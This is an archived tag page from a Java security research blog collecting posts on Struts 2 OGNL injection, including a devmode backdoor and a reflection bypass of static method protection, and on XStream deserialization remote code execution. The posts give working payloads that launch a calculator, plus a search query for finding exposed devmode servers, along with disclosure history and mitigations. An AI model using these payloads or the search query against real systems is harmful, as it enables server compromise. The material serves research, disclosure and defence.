

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Java - Page 1 - &lt;/pwntester&gt;</title>
    <meta name="description" content="">

    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="shortcut icon" href="../../assets/favicon.png?v=d47df0f104">

    <link rel="stylesheet" type="text/css" href="../../assets/css/screen.css?v=d47df0f104">
    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
    <link href="http://fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">

    <script type="text/javascript" src="../../assets/js/jquery-1.11.1.min.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/jquery.fitvids.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/moment.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/handlebars.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/jquery.tapirus.js?v=d47df0f104"></script> 
    <script type="text/javascript" src="../../assets/js/index.js?v=d47df0f104"></script>


    <link rel="canonical" href="http://www.pwntester.com/tag/java/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="&lt;/pwntester&gt;">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Java - Page 1 - &lt;/pwntester&gt;">
    <meta property="og:url" content="http://www.pwntester.com/tag/java/">
    <meta property="article:modified_time" content="2014-05-04T16:31:52.000Z">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Java - Page 1 - &lt;/pwntester&gt;">
    <meta name="twitter:url" content="http://www.pwntester.com/tag/java/">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Series",
    "publisher": {
        "@type": "Organization",
        "name": "&lt;/pwntester&gt;",
        "logo": "http://www.pwntester.com/content/images/2014/May/rooted.jpeg"
    },
    "url": "http://www.pwntester.com/tag/java/",
    "name": "Java",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "http://www.pwntester.com"
    }
}
    </script>

    <meta name="generator" content="Ghost 0.11">
    <link rel="alternate" type="application/rss+xml" title="&lt;/pwntester&gt;" href="http://www.pwntester.com/rss/">

    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../assets/css/prism.css?v=d47df0f104">

    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-49973078-2', 'pwntester.com');
  ga('send', 'pageview');

</script></head>

<body class="tag-template tag-java">

    <div id="sidebar">
        <div id="sidebar-content" class="inner">
            <a class="blog-logo" href="http://www.pwntester.com"><img src="../../content/images/2014/May/rooted.jpeg" alt="Blog Logo"></a>
            <h2 class="blog-title"><a href="http://www.pwntester.com">&lt;/pwntester&gt;</a>
            <h3 class="blog-description"></h3></h2>

            <!--form id="search">
                <input id="search-field" placeholder="Search"/>
            </form-->
            <form id="search">  
                <input id="search-field" type="search" placeholder="Search">
            </form>  

            <div id="sidebar-links">
                <ul id="subscription-links">
                    <li><a target="_blank" href="http://www.pwntester.com/rss/"><i class="fa fa-rss"></i> Subscribe via RSS</a></li>
                    <!-- No support yet
                    <li><a target="_blank" href=" "><i class="fa fa-envelope"></i> Subscribe via email<a></li>
                    -->
                </ul>
                <ul id="sidebar-internal">
                    <!-- For 'About' and other pages -->
                </ul>
                <ul id="sidebar-external">
                    <li class="external-link"><a href="https://github.com/pwntester"><i class="fa fa-github"></i> GitHub</a></li>
<li class="external-link"><a href="http://www.linkedin.com/in/alvaroms"><i class="fa fa-linkedin"></i> LinkedIn</a></li>
<li class="external-link"><a href="https://twitter.com/pwntester"><i class="fa fa-twitter"></i> Twitter</a></li>
<li class="external-link"><a target="_blank" href="mailto:alvaro@pwntester.com"><i class="fa fa-envelope"></i> Contact</a></li>
                </ul>
            </div>

            <footer class="site-footer">
                <section class="copyright">© 2017 <a href="mailto:alvaro@pwntester.com">Alvaro Muñoz</a> • All rights reserved.</section>
            </footer>
        </div>
    </div>

    <main>
        <section id="results"></section>
        

<header class="tag-archive-header">
    <h4><i class="fa fa-tag"></i><span class="tag-archive-header-name">Java</span></h4>
</header>


<article class="post tag-java tag-ognl tag-struts2">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-21">21 Jan 2014</time> on <a href="index.html">Java</a>, <a href="../ognl/">OGNL</a>, <a href="../struts2/">Struts2</a></span>
        <h2 class="post-title"><a href="../../blog/2014/01/21/struts-2-devmode-an-ognl-backdoor/">Struts 2 devmode: An OGNL backdoor</a></h2>

    </header>
    <section class="post-content">
        <p>There are many Struts 2 developers familiar with the Struts 2 <a href="http://struts.apache.org/release/2.3.x/docs/devmode.html">development mode</a> on which more verbose logs are produced and handy resource reloading is done on a request basis to avoid restarting the server every time we change a property, validator and so on. <br>
What it is not so well known (actually it doesn’t even appear in the Struts 2 <a href="http://struts.apache.org/release/2.3.x/docs/devmode.html">devmode site</a>) is that it enables a OGNL injection backdoor allowing the developers to check their Value Stacks with ease and from a handy OGNL console or request parameter. This handy feature for developers turns into a security nightmare if application is released into production servers with this flag on.</p>

<p>If we look at the <a href="http://struts.apache.org/release/2.3.x/docs/debugging.html">“debugging” page</a>, we can find some info on how it works. It enables the <a href="http://struts.apache.org/release/2.3.x/docs/debugginginterceptor.html">debugging interceptor</a> which brings us some interesting commands:</p>

<ul>
<li><strong>xml</strong>: Dumps the parameters, context, session, and value stack as an XML document.</li>
<li><strong>console</strong>: Shows a popup 'OGNL Console' that allows the user to test OGNL expressions against the value stack. The XML data from the 'xml' mode is inserted at the top of the page.</li>
</ul>

<p><img src="../../content/images/octopress/devmode-1.png" alt=""></p>

<ul>
<li><strong>command</strong>: Tests an OGNL expression and returns the string result. Only used by the OGNL console.</li>
<li><strong>browser</strong>: Shows field values of an object specified in the object parameter (#context by default). When the object parameters is set, the '#' character needs to be escaped to '%23'. Like debug=browser&amp;object=%23parameters</li>
</ul>

<p><img src="../../content/images/octopress/devmode-2.png" alt=""></p>

<p>So we can abuse this feature to run our arbitrary commands by loading the following page:</p>

<pre><code class="language-lang-bash line-numbers ">http://vulnserver.com/some.action?debug=command&amp;expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,@java.lang.Runtime@getRuntime%28%29.exec%28%27/Applications/Calculator.app/Contents/MacOS/Calculator%27%29  
</code></pre>

<p>Note that this will work even with the latest Struts 2 version (where “allowStaticMethodAccess” is immutable) using the payload explained in this <a href="http://www.pwntester.com/blog/2014/01/20/time-to-update-your-ognl-payloads/">previous post</a></p>

<p>Now, you may be wondering who releases its applications in devmode? Go, check it yourself:</p>

<pre><code class="language-lang-bash line-numbers ">https://www.google.com/search?q=intitle%3A%22Struts+Problem+Report%22+%22You+are+seeing+this+page+because+development+mode+is+enabled.%22  
</code></pre>

<p>So, don’t forget to disable devmode before releasing your applications to production.</p>
    </section>
</article>


<article class="post tag-java tag-ognl">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-01-20">20 Jan 2014</time> on <a href="index.html">Java</a>, <a href="../ognl/">OGNL</a></span>
        <h2 class="post-title"><a href="../../blog/2014/01/20/time-to-update-your-ognl-payloads/">Time to update your OGNL payloads</a></h2>

    </header>
    <section class="post-content">
        <p>OGNL is an expression language for getting and setting properties of Java objects, plus other extras such as list projection, selection, lambda expressions and method invocation. So if attackers can provide the OGNL engine with arbitrary OGNL expressions, they will be able to execute arbitrary code on the application server and/or access and modify any value stored in the Struts 2 value stack.</p>

<p>Struts 2 provided an addition layer of protection by disabling static method invocation so that methods like <strong>java.lang.Runtime.exec</strong> could not be executed. This protection was bypassed in the first place by <a href="https://twitter.com/meder">Meder Kydyraliev</a> who came up with the following OGNL expression where he was able to modify the required objects in order to disable the protection before actually calling the static methods:</p>

<pre><code class="language-lang-java line-numbers data-line=1 ">#_memberAccess['allowStaticMethodAccess'] = true
#rt = @java.lang.Runtime@getRuntime()
#rt.exec('calc')
</code></pre>

<p>Its important to note that even if static methods were not allowed, an attacker will normally be able to modify objects stored in the Value Stack like “Session” and cause severe damage to the running application and back end.</p>

<p>Due to the severity of the vulnerabilities and the number of them being reported at that time, Struts 2 decided to make the <strong>#_memberAccess</strong> “<strong>allowStaticMethodAccess</strong>” member immutable in version 2.3.14.2, effectively disabling Meder’s payload.</p>

<p>This control is still easily bypassable using basic Java reflection to set the “<strong>allowStaticMethodAccess</strong>” as an accessible field:</p>

<pre><code class="language-lang-java line-numbers data-line=1-3 ">#f = #_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')
#f.setAccessible(true)
#f.set(#_memberAccess, true)
#rt = @java.lang.Runtime@getRuntime()
#rt.exec('calc')
</code></pre>

<p>Note that even if the application is using the latest Struts 2 version, a developer can still pass user controlled data to Struts 2 methods evaluating their arguments as OGNL Expressions as the <a href="http://security.coverity.com/advisory/2013/Oct/remote-code-execution-in-apache-roller-via-ognl-injection.html"><strong>Apache Roller</strong> vulnerability</a> found by <a href="https://twitter.com/jonpasski">Jon Passki</a></p>
    </section>
</article>


<article class="post tag-springmvc10 tag-java tag-rce39 tag-xstream">
    <header class="post-header">
        <span class="post-meta"><time datetime="2013-12-24">24 Dec 2013</time> on <a href="../springmvc10/">SpringMVC</a>, <a href="index.html">Java</a>, <a href="../rce39/">RCE</a>, <a href="../xstream/">XStream</a></span>
        <h2 class="post-title"><a href="../../blog/2013/12/24/more-on-xstream-rce-springmvc-ws/">More on XStream RCE: SpringMVC WS</a></h2>

    </header>
    <section class="post-content">
        <p>Continuing my previous post where I mentioned that the <a href="http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization/">XStream RCE issue</a> issue also affected SpringMVC RESTful WebServices using the XStream SpringOXM wrapper, I  wanted to share a POC server. The code is quite simple and can be found in the <a href="https://github.com/pwntester/XStreamServer">XStreamServer GitHub Repo</a>. It contains a WebService defined by the <strong>ContactController</strong>:</p>

<pre><code class="language-lang-java line-numbers ">@Controller
@RequestMapping("/contacts")
public class ContactController {

    @Autowired
    private ContactRepository contactRepository;

    @RequestMapping( value = "/{id}", method = RequestMethod.GET )
    @ResponseStatus(HttpStatus.OK)
    @ResponseBody
    public final Contact get( @PathVariable( "id" ) final Long contactId ){
        System.out.println("get");
        return contactRepository.findOne(contactId);
    }

    @RequestMapping( method = RequestMethod.POST )
    @ResponseStatus( HttpStatus.CREATED )
    @ResponseBody
    public final String create( @RequestBody final Contact contact ){
        System.out.println("Contact name: " + contact.getFirstName());
        contactRepository.save((ContactImpl) contact);
        return "OK";
    }
}
</code></pre>

<p>The <strong>create</strong> method binds an incoming XML message with a <strong>Contact</strong> instance. This application is configured to use <strong>XStream</strong> as its binding library as shown here:</p>

<pre><code class="language-lang-markup line-numbers ">&lt;!-- Marshaller configuration --&gt;  
&lt;bean id="marshallingHttpMessageConverter" class="org.springframework.http.converter.xml.MarshallingHttpMessageConverter"&gt;  
    &lt;property name="marshaller" ref="xstreamMarshaller"/&gt;
    &lt;property name="unmarshaller" ref="xstreamMarshaller"/&gt;
&lt;/bean&gt;

&lt;bean id="xstreamMarshaller" class="org.springframework.oxm.xstream.XStreamMarshaller"&gt;  
    &lt;property name="aliases"&gt;
        &lt;props&gt;
            &lt;prop key="contact"&gt;org.pwntester.springserver.ContactImpl&lt;/prop&gt;
        &lt;/props&gt;
    &lt;/property&gt;
&lt;/bean&gt;  
</code></pre>

<p>So SpringMVC will handle the XML document to the SpringOXM wrapper for unmarshalling. SpringOXM uses the <strong>XStreamMarshaller</strong> so it will simply call <strong>XStream</strong> in order to unmarshall the <strong>Contact</strong> object. At this point and with the details provided in the <a href="http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization/">XStream RCE post</a> its game over.</p>

<p>Use maven and jetty to start the server:  </p>

<pre><code class="language-lang-bash line-numbers ">mvn -Djetty.port=8080 -DDebug clean jetty:run  
</code></pre>

<p>Expected use:  </p>

<pre><code class="language-lang-bash line-numbers ">curl --header "content-type: application/xml" --data @contact.xml "http://localhost:8080/contacts"  
</code></pre>

<p>Exploit knowing the interface:  </p>

<pre><code class="language-lang-bash line-numbers ">curl --header "content-type: application/xml" --data @exploit.xml "http://localhost:8080/contacts"  
</code></pre>

<p>Generic Exploit:  </p>

<pre><code class="language-lang-bash line-numbers ">curl --header "content-type: application/xml" --data @exploit2.xml "http://localhost:8080/contacts"  
</code></pre>

<h2 id="whattodoaboutit">What to do about it</h2>

<p>When I reported the issue to the Spring Security Team they updated their documentation and they added a CatchAllConverter for the users to use if they wish:</p>

<p>Documentation changes:</p>

<ul>
<li><a href="https://github.com/SpringSource/spring-framework/commit/4da7e304b86c9528d05b51b02459ee071b65e68a#spring-oxm/src/main/java/org/springframework/oxm/xstream/XStreamMarshaller.java">https://github.com/SpringSource/spring-framework/commit/4da7e304b86c9528d05b51b02459ee071b65e68a#spring-oxm/src/main/java/org/springframework/oxm/xstream/XStreamMarshaller.java</a></li>
<li><a href="https://github.com/SpringSource/spring-framework/commit/5311e84c64cb453e3779a4f235c5030b7c569edd#spring-oxm/src/main/java/org/springframework/oxm/xstream">https://github.com/SpringSource/spring-framework/commit/5311e84c64cb453e3779a4f235c5030b7c569edd#spring-oxm/src/main/java/org/springframework/oxm/xstream</a></li>
<li><a href="https://github.com/SpringSource/spring-framework/commit/d9bfac393bc8f2df93a29cf685e7d81c222a59e7#spring-oxm/src/main/java/org/springframework/oxm/xstream">https://github.com/SpringSource/spring-framework/commit/d9bfac393bc8f2df93a29cf685e7d81c222a59e7#spring-oxm/src/main/java/org/springframework/oxm/xstream</a></li>
</ul>

<p>Jira ticket to create a new <strong>CatchAllConverter</strong>:</p>

<ul>
<li><a href="https://jira.springsource.org/browse/SPR-10821?page=com.googlecode.jira-suite-utilities:transitions-summary-tabpanel">https://jira.springsource.org/browse/SPR-10821?page=com.googlecode.jira-suite-utilities:transitions-summary-tabpanel</a></li>
</ul>

<blockquote>
  <p>The main purpose of the catch-all converter class is to register itself as a catchall last converter with normal (or higher) priority, after converters that support specific domain classes. That way default XStream converters with lower priorities and <strong>possible security vulnerabilities</strong> do not get invoked.</p>
</blockquote>

<p>They added the catch-all converter which is great but they did not register it by default so unless your XStreamMarshaller config looks the following, you will be in trouble:</p>

<pre><code class="language-lang-markup line-numbers ">&lt;!-- Marshaller configuration --&gt;  
&lt;bean id="marshallingHttpMessageConverter" class="org.springframework.http.converter.xml.MarshallingHttpMessageConverter"&gt;  
    &lt;property name="marshaller" ref="xstreamMarshaller"/&gt;
    &lt;property name="unmarshaller" ref="xstreamMarshaller"/&gt;
&lt;/bean&gt;

&lt;bean id="xstreamMarshaller" class="org.springframework.oxm.xstream.XStreamMarshaller"&gt;  
    &lt;property name="aliases"&gt;
        &lt;props&gt;
            &lt;prop key="contact"&gt;org.pwntester.springserver.ContactImpl&lt;/prop&gt;
        &lt;/props&gt;
    &lt;/property&gt;
    &lt;property name="converters"&gt;
        &lt;list&gt;
            &lt;bean class="org.springframework.oxm.xstream.CatchAllConverter"/&gt;
            &lt;bean class="org.pwntester.springserver.ContactConverter"/&gt;
        &lt;/list&gt;
    &lt;/property&gt;
&lt;/bean&gt;  
</code></pre>

<p>Please note that Spring documentation is wrong and the "CatchAllConverter" needs to be registered in the first place so it gets lower priority as showed in the <a href="http://grepcode.com/file/repo1.maven.org/maven2/org.springframework.ws/spring-ws/1.5.10/org/springframework/oxm/xstream/XStreamMarshaller.java#XStreamMarshaller.setConverters%28org.springframework.oxm.xstream.ConverterMatcher%5B%5D%29">XStreamMarshaller.setConverters</a> code and not in the last place as suggested by the documentation:</p>

<pre><code class="language-lang-java line-numbers ">    public void  [More ...] setConverters(ConverterMatcher[] converters) {
        for (int i = 0; i &lt; converters.length; i++) {
            if (converters[i] instanceof Converter) {
                getXStream().registerConverter((Converter) converters[i], i);
            }
            else if (converters[i] instanceof SingleValueConverter) {
                getXStream().registerConverter((SingleValueConverter) converters[i], i);
            }
            else {
                throw new IllegalArgumentException("Invalid ConverterMatcher [" + converters[i] + "]");
            }
        }
    }
</code></pre>

<p>So summing up, if you are using XStream marshaller in your SpringMVC web service and havent set any Catch-All Converter, you are screwed. But it has an easy (undocumented) solution:</p>

<ul>
<li>Write a custom converter for each of the classes you are expecting</li>
<li>Register a <strong>CatchAllConverter</strong> followed by your custom converters in the <strong>XStreamMarshaller</strong> configuration.</li>
</ul>

<p>Thanks for reading!</p>
    </section>
</article>


<article class="post tag-java tag-exploit tag-rce39 tag-xstream">
    <header class="post-header">
        <span class="post-meta"><time datetime="2013-12-23">23 Dec 2013</time> on <a href="index.html">Java</a>, <a href="../exploit/">Exploit</a>, <a href="../rce39/">RCE</a>, <a href="../xstream/">XStream</a></span>
        <h2 class="post-title"><a href="../../blog/2013/12/23/rce-via-xstream-object-deserialization38/">RCE via XStream object deserialization</a></h2>

    </header>
    <section class="post-content">
        <p>When researching <a href="http://www.pwntester.com/blog/2013/08/23/springmvc-vulnerable-to-xxe/">SpringMVC RESTful APIs and their XXE vulnerabilities</a> I found that <a href="http://xstream.codehaus.org/index.html">XStream</a> was not vulnerable to XXE because it ignored the <strong>&lt;DOCTYPE /&gt;</strong> blocks. Curious about it I decided to took a deeper look at XStream and found out that its not just a simple marshalling library as JAXB but a much more powerful serializing library capable of serializing to an XML representation really complex types and not just POJOs. I took a look at the list of <a href="http://xstream.codehaus.org/converters.html">XStream converters</a> and found the following interesting one:</p>

<p><img src="../../content/images/octopress/reflectionconverter.png" alt=""></p>

<p>As stated by the XStream documentation:</p>

<blockquote>
  <p>The dynamic proxy itself is not serialized, however the interfaces it implements and the actual InvocationHandler instance are serialized. This allows the proxy to be reconstructed after deserialization.</p>
</blockquote>

<p>This allow us to send an XML representation of a dynimic proxy where the InvocationHandler will be XStream serialized. The XML representation will look something like:</p>

<pre><code class="language-lang-markup line-numbers "> &lt;dynamic-proxy&gt;
  &lt;interface&gt;com.foo.Blah&lt;/interface&gt;
  &lt;interface&gt;com.foo.Woo&lt;/interface&gt;
  &lt;handler class="com.foo.MyHandler"&gt;
    &lt;something&gt;blah&lt;/something&gt;
  &lt;/handler&gt;
&lt;/dynamic-proxy&gt;  
</code></pre>

<p>So for those not familiar with a dynamic proxy, lets say that is a way to intercept any call to an interface declared method so that when the method is invoked on the proxified interface we can hook the method call and inject any custom code.</p>

<p><img src="../../content/images/octopress/proxy.png" alt=""></p>

<p>The <strong>InvocationHandler</strong> will be the responsable to handle the intercepted call. For our exploit we will be using <a href="http://docs.oracle.com/javase/7/docs/api/java/beans/EventHandler.html">java.beans.EventHandler</a> that does not implement the <strong>Serializable</strong> interface so we could not use it for our <a href="http://www.pwntester.com/blog/2013/12/16/rce-through-deserialization-of-spring-defaultlistablebeanfactories-cve-2011-2894/">CVE-2011-2894 exploit</a> but that is serializable using XStream.</p>

<p>The simplest scenario is the one where the server is expecting a serialized instance that implements a given interface. Lets say that the server code looks like:</p>

<pre><code class="language-lang-java line-numbers ">@Controller
 @RequestMapping("/contacts")
 public class ContactController {
     @Autowired
     private ContactRepository contactRepository;

     @RequestMapping( method = RequestMethod.POST )
     @ResponseStatus( HttpStatus.CREATED )
      public final String create( @RequestBody Contact contact ){
         log(”Creating new contact: " + contact.getFirstName());
         contactRepository.save(contact);
         return "OK";
     }
 }
</code></pre>

<p>So the idea is to:</p>

<ul>
<li>Find out what Class the XML will be deserialized to (in this case com.company.model.Contact)</li>
<li>Create a proxy for that class</li>
<li>Intercept/hook any call to any method in the interface</li>
<li>Replace the original call with the malicious payload</li>
<li>Send the serialized version of the proxy</li>
<li>Cross-fingers</li>
<li>Profit</li>
</ul>

<p>So this is what our server application was expecting:</p>

<pre><code class="language-lang-markup line-numbers ">&lt;contact&gt;  
    &lt;id&gt;1&lt;/id&gt;
    &lt;firstName&gt;alvaro&lt;/firstName&gt;
    &lt;lastName&gt;munoz&lt;/lastName&gt;
    &lt;email&gt;alvaro@pwntester.com&lt;/email&gt;
&lt;/contact&gt;  
</code></pre>

<p>And this is what we will send in order to execute any arbitrary payload:</p>

<pre><code class="language-lang-markup line-numbers ">&lt;dynamic-proxy&gt;  
&lt;interface&gt;com.company.model.Contact&lt;/interface&gt;  
&lt;handler class="java.beans.EventHandler"&gt;  
    &lt;target class="java.lang.ProcessBuilder"&gt;
    &lt;command&gt;&lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;&lt;/command&gt;
    &lt;/target&gt;
    &lt;action&gt;start&lt;/action&gt;
&lt;/handler&gt;  
&lt;/dynamic-proxy&gt;  
</code></pre>

<p>As you can see we are defining a <strong>dynamic proxy</strong> for the "com.company.model.Contact" interface and intercepting any method call on that interface with a "java.beans.EventHandler" invocation handler. This handler will replace the original method call with a call to "java.lang.ProcessBuilder.start("/Applications/Calculator.app/Contents/MacOS/Calculator")".</p>

<p>Convenient, isn't it?</p>

<p>So as soon as the server code reaches a method call on the proxified interface like the following line on our example controller:</p>

<pre><code class="language-lang-java line-numbers ">log(”Creating new contact: " + contact.getFirstName());  
</code></pre>

<p>The method call will be intercepted and replaced with our payload and the result will be a malicious calculator running on the server :)</p>

<p><img src="../../content/images/octopress/calc.png" alt=""></p>

<h2 id="increasingthesuccesslikelihood">Increasing the success likelihood</h2>

<p>Finding out what Class the server is expecting can be difficult and we also have the limitation that the class needs to implements an interface. How many applications have you seen using interfaces for POJO DTOs?? A solution for this problem is to serialize an object that contains other objects and that in order to instantiate this object, a call to an interface method has to be made. This is where we will be able to inject our malicious code using an <strong>InvocationHandler</strong>. The original idea by <strong>Jörg Schaible</strong> (XStream developer) was proposed during the disclosure to the XStream team and can be found <a href="https://www.mail-archive.com/user@xstream.codehaus.org/msg00605.html">here</a>. This variant consists on serializing a <a href="http://docs.oracle.com/javase/6/docs/api/java/util/TreeSet.html">java.util.TreeSet</a> containg different objects implementing the <a href="http://docs.oracle.com/javase/7/docs/api/java/lang/Comparable.html">java.lang.Comparable</a> interface so that when the <strong>Set</strong> is instantiated on the server side, the <strong>Comparable</strong> interface methods are called to sort the <strong>Set</strong>. All we have to do now is to add a dynamic proxy intercepting any method call to the <strong>Comparable</strong> interface and replacing it with our payload:</p>

<pre><code class="language-lang-java line-numbers ">Set&lt;Comparable&gt; set = new TreeSet&lt;Comparable&gt;();  
set.add("foo");  
set.add(EventHandler.create(Comparable.class, new ProcessBuilder("open","/Applications/Calculator.app"), "start"));  
</code></pre>

<p>If we try to serialize it using XStream <strong>toXML</strong> it will throw a Cast exception and we wont be able to get the serialized version:</p>

<pre><code class="language-lang-java line-numbers ">Set&lt;Comparable&gt; set = new TreeSet&lt;Comparable&gt;();  
set.add("foo");  
set.add(EventHandler.create(Comparable.class, new ProcessBuilder("/Applications/Calculator.app/Contents/MacOS/Calculator"), "start"));  
String payload = xstream.toXML(set);  
System.out.println(payload);  
</code></pre>

<p>Will throw:</p>

<pre><code class="language-lang-bash line-numbers ">Exception in thread "main" java.lang.ClassCastException: java.lang.UNIXProcess cannot be cast to java.lang.Integer  
  at com.sun.proxy.$Proxy4.compareTo(Unknown Source)
  at java.util.TreeMap.put(TreeMap.java:560)
  at java.util.TreeSet.add(TreeSet.java:255)
  at com.pwntester.xstreampoc.Main.main(Main.java:26)
  at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
  at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
  at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
  at java.lang.reflect.Method.invoke(Method.java:601)
  at com.intellij.rt.execution.application.AppMain.main(AppMain.java:120)
</code></pre>

<p>That will also happen during the deserialization process but at least we will be able to execute our payload. <br>
Anyway, we will need to craft the payload by hand and we will get something like:</p>

<pre><code class="language-lang-markup line-numbers ">&lt;sorted-set&gt;  
  &lt;string&gt;foo&lt;/string&gt;
  &lt;dynamic-proxy&gt;
    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
    &lt;handler class="java.beans.EventHandler"&gt;
      &lt;target class="java.lang.ProcessBuilder"&gt;
        &lt;command&gt;
          &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;
        &lt;/command&gt;
      &lt;/target&gt;
      &lt;action&gt;start&lt;/action&gt;
    &lt;/handler&gt;
  &lt;/dynamic-proxy&gt;
&lt;/sorted-set&gt;  
</code></pre>

<p>Now, if we deserialize this XML, we will get a Cast exception and our malicious calculator running on the server:</p>

<pre><code class="language-lang-java line-numbers ">String payload = "&lt;sorted-set&gt;" +  
        "&lt;string&gt;foo&lt;/string&gt;" +
        "&lt;dynamic-proxy&gt;" +
        "&lt;interface&gt;java.lang.Comparable&lt;/interface&gt;" +
        "&lt;handler class=\"java.beans.EventHandler\"&gt;" +
        " &lt;target class=\"java.lang.ProcessBuilder\"&gt;" +
        " &lt;command&gt;" +
        " &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;" +
        " &lt;/command&gt;" +
        " &lt;/target&gt;" +
        " &lt;action&gt;start&lt;/action&gt;" +
        "&lt;/handler&gt;" +
        "&lt;/dynamic-proxy&gt;" +
        "&lt;/sorted-set&gt;";

Contact c = (Contact) xstream.fromXML(payload);  
</code></pre>

<p><img src="../../content/images/octopress/calc.png" alt=""></p>

<p>You can find the whole project POC in the <a href="https://github.com/pwntester/XStreamPOC">XStream POC github repo</a></p>

<h2 id="disclosure">Disclosure</h2>

<p>I reported this issue to the XStream developers. I was wondering if there was any way to unregister the <strong>reflection</strong> converter by default. As you can see in this <a href="https://www.mail-archive.com/user@xstream.codehaus.org/msg00602.html">mail thread</a>, there was a solution. Unregistering the converter was not possible but registering a catch-all converter with higher priority than the reflection one should be possible.</p>

<p>As the XStream team argued, disabling it dy default was not an option since it was used by 99% of all projects using XStream:</p>

<blockquote>
  <blockquote>
    <blockquote>
      <p>Would it be possible to not register the reflection converters by default so only users that need them do it?
      Unfortunately no. It's one of XStream's key features that you actually can
      marshal nearly any object graph out of the box. If we drop the
      ReflectionConverter as catch all, we'll break immediately ~99% of all
      existing projects using XStream.</p>
    </blockquote>
  </blockquote>
</blockquote>

<p>I was ok with that since at least there was a way to "disable" it manually. But I saw no point on having the reflection converter on by default in SpringOXM when used for building RESTful webservices. RESTful APIs are about representation of entities and I see no point on serializing dynamic proxies to represent those entities. I got in contact with Spring Security Team and let them know the issue. Their response was that <strong>XStream</strong> should not be use for RESTFul webservices and that they wont disable the converter by default in their SpringOXM wrapper since its not only used by SpringMVC but they agreed in updating the <a href="https://github.com/spring-projects/spring-framework/pull/322/files">SpringMVC documentation</a> to reflect that <strong>XStreamMarshaller</strong> should be used at your own risk when used to build RESTful APIs.</p>

<p><img src="../../content/images/octopress/springdocs.png" alt=""></p>

<h2 id="whattodoaboutit">What to do about it</h2>

<p>Ok, so what can we do as developers to avoid this? We need to:</p>

<ul>
<li>Register a standard priority converter for the beans you are expecting in your application</li>
<li>Register a catch-all converter with higher priority than the reflection ones (low priority) and make the converter to return <strong>null</strong> on its <strong>unmarshall</strong> method so any object deserialized by the catch-all converter, will throw an exception and interrupt the converter chain before hitting the Reflection converters.</li>
</ul>

<p>Writing a custom converter is easy and its explaind in detail on the <a href="http://xstream.codehaus.org/converter-tutorial.html">XStream documentation</a>. We will be creating a custom converter for the <strong>Contact</strong> class in the <a href="https://github.com/pwntester/XStreamPOC">XStream POC</a> example presented above:</p>

<pre><code class="language-lang-java line-numbers ">package com.pwntester.xstreampoc;

import com.thoughtworks.xstream.converters.Converter;  
import com.thoughtworks.xstream.converters.MarshallingContext;  
import com.thoughtworks.xstream.converters.UnmarshallingContext;  
import com.thoughtworks.xstream.io.HierarchicalStreamReader;  
import com.thoughtworks.xstream.io.HierarchicalStreamWriter;

public class ContactConverter implements Converter {

    public boolean canConvert(Class clazz) {
        return clazz.equals(Contact.class);
    }

    public void marshal(Object value, HierarchicalStreamWriter writer, MarshallingContext context) {
        Contact contact = (Contact) value;
        writer.startNode("name");
        writer.setValue(contact.getName());
        writer.endNode();
    }

    public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {
        Contact contact = new Contact();
        reader.moveDown();
        contact.setName(reader.getValue());
        reader.moveUp();
        return contact;
    }

}
</code></pre>

<p>For the catch-all converter, we will return <strong>null</strong> when unmarshalling:</p>

<pre><code class="language-lang-java line-numbers ">package com.pwntester.xstreampoc;

import com.thoughtworks.xstream.converters.Converter;  
import com.thoughtworks.xstream.converters.MarshallingContext;  
import com.thoughtworks.xstream.converters.UnmarshallingContext;  
import com.thoughtworks.xstream.io.HierarchicalStreamReader;  
import com.thoughtworks.xstream.io.HierarchicalStreamWriter;

public class CatchAllConverter implements Converter {

    public boolean canConvert(Class clazz) {
        return true;
    }

    public void marshal(Object value, HierarchicalStreamWriter writer, MarshallingContext context) {
    }

    public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {
       return null;
    }

}
</code></pre>

<p>Ok, now before deserializing our untrusted input we have to register our new converters:</p>

<pre><code class="language-lang-java line-numbers ">XStream xstream = new XStream(new DomDriver());  
xstream.processAnnotations(Contact.class);  
xstream.registerConverter(new ContactConverter());  
xstream.registerConverter(new CatchAllConverter(), XStream.PRIORITY_VERY_LOW);  
</code></pre>

<p>We need to wrap our deserializing call within a try-catch block:</p>

